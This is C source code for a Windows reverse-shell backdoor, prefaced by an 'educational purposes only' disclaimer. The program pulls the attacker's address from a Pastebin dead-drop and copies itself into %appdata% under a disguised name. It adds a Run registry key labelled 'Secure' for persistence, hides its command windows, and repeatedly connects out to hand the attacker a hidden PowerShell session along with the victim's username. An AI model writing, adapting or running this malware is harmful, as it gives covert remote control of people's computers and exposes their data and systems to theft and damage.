#include <stdio.h>
#include <time.h>
#include <Lmcons.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <wininet.h>

#define DEF_BUFF 2048
#define PASTEBIN_URL "https://pastebin.com/raw/ENTER_PASTEBIN_HERE"


/*
 * MUST READ - Legal Notice:
 * 
 * This code is provided for EDUCATIONAL PURPOSES ONLY. It is intended to demonstrate
 * certain programming concepts and techniques related to network communication and
 * process control. This code should NOT be used for any malicious or unauthorized activities.
 * 
 * The author (cdkw) disclaims any responsibility for any misuse of this code and is not liable
 * for any legal consequences that may arise from its use. Always ensure compliance with
 * applicable laws and regulations when using or adapting this code. 
 * Do not hack anyone without their consent!
 */


// ascuns
void run_hidden_command(const char *command) {
    SHELLEXECUTEINFO shExecInfo = {0};
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = "open";
    shExecInfo.lpFile = "cmd.exe";
    shExecInfo.lpParameters = "/c ";

    char *fullCommand = (char *)malloc(strlen(command) + 4);
    if (fullCommand == NULL) {
        perror("Memory allocation error");
        return;
    }
    strcpy(fullCommand, shExecInfo.lpParameters);
    strcat(fullCommand, command);

    shExecInfo.lpParameters = fullCommand;
    shExecInfo.nShow = SW_HIDE; // sa nu se vada

    if (!ShellExecuteEx(&shExecInfo)) {
        perror("Error executing command");
    }

    WaitForSingleObject(shExecInfo.hProcess, INFINITE);

    free(fullCommand);
    CloseHandle(shExecInfo.hProcess);
}

// ip & port from pastebin
int get_ip_port_from_pastebin(char *ip, int *port) {
    HINTERNET hInternet = InternetOpen("PastebinFetcher", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) { //no internet
        return 1;
    }

    HINTERNET hConnect = InternetOpenUrl(hInternet, PASTEBIN_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) { // no url
        InternetCloseHandle(hInternet);
        return 1;
    }

    char buffer[DEF_BUFF];
    DWORD bytesRead;
    if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        sscanf(buffer, "%[^:]:%d", ip, port);
    } else { //cant read
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}

// rsh
void rsh(char* server, int Port, int interval) {
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in address;
    STARTUPINFO process_startup;
    PROCESS_INFORMATION p_info;
    char shell_id[20];
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    char install_date[20];
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    snprintf(shell_id, sizeof(shell_id), "Shell_%04X%04X ", rand() & 0xFFFF, rand() & 0xFFFF);
    GetUserName(username, &username_len);
    snprintf(install_date, sizeof(install_date), " %02d-%02d-%04d ", tm.tm_mday, tm.tm_mon + 1, tm.tm_year + 1900);

    while (1) {
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        address.sin_family = AF_INET;
        address.sin_port = htons(Port);
        address.sin_addr.s_addr = inet_addr(server);

        if (WSAConnect(Winsock, (SOCKADDR*)&address, sizeof(address), NULL, NULL, NULL, NULL) == 0) {
            send(Winsock, shell_id, strlen(shell_id), 0);
            send(Winsock, username, strlen(username), 0);
            send(Winsock, install_date, strlen(install_date), 0);

            memset(&process_startup, 0, sizeof(process_startup));
            char proc[] = "powershell.exe -WindowStyle Hidden";
            process_startup.cb = sizeof(process_startup);
            process_startup.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            process_startup.hStdInput = process_startup.hStdOutput = process_startup.hStdError = (HANDLE)Winsock;
            process_startup.wShowWindow = SW_HIDE;

            if (!CreateProcess(NULL, proc, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &process_startup, &p_info)) {
                printf("Failed to create process: %d\n", GetLastError());
            }

            CloseHandle(p_info.hProcess);
            CloseHandle(p_info.hThread);
        }

        closesocket(Winsock);
        WSACleanup();
        Sleep(interval * 1000);
    }
}

// filename
const char* get_filename(const char* path) {
    const char* filename = strrchr(path, '\\');
    if (filename == NULL) {
        return path;
    } else {
        return filename + 1;
    }
}

int main() {
    char h[256];
    int p = 0;
    int interval = 3;

    if (get_ip_port_from_pastebin(h, &p)) {
        return 1;
    }

    // ia filename dinamic
    const char* filename = get_filename(".\\USBDrivers.exe");

    char copyCommand[256];
    snprintf(copyCommand, sizeof(copyCommand), "cmd /c copy .\\%s %%appdata%%\\sVSi$svo.exe", filename, filename);
    run_hidden_command(copyCommand);

    // persistenta
    char regCommand[256];
    snprintf(regCommand, sizeof(regCommand), "cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%%appdata%%\\%s.exe\"", filename);
    run_hidden_command(regCommand);

    rsh(h, p, interval);

    return 0;
}
